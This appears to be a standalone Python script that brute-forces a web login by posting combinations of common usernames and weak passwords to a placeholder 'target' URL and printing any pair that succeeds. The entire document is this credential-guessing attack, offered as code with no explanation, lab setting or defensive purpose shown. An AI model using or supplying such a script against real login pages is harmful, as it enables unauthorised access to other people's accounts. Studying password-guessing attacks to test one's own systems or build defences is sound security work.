import requests

url = "http://target/login"
usernames = ["admin", "user", "guest"]
passwords = ["password", "123456", "admin"]

for username in usernames:
    for password in passwords:
        response = requests.post(url, data={"username": username, "password": password})
        if "Login successful" in response.text:
            print(f"Success: {username}:{password}")
